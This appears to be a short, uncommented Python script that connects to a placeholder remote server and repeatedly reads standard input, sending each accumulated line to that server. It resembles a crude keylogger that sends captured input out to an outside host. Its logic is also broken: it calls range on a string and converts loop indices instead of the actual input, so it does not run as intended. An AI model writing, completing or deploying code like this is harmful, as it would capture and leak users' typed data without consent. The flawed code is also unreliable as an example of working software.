import socket
import sys
import time
import os

server_address = ('your_server_address', 1234)
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.connect(server_address)

while True:
    keys = ""

    for i in range(sys.stdin.read()):
        key = chr(i)
        if key == '\n':
            
            server.send(keys.encode())
            keys = ""
        else:
            keys += key

    time.sleep(0.01) 

server.close()
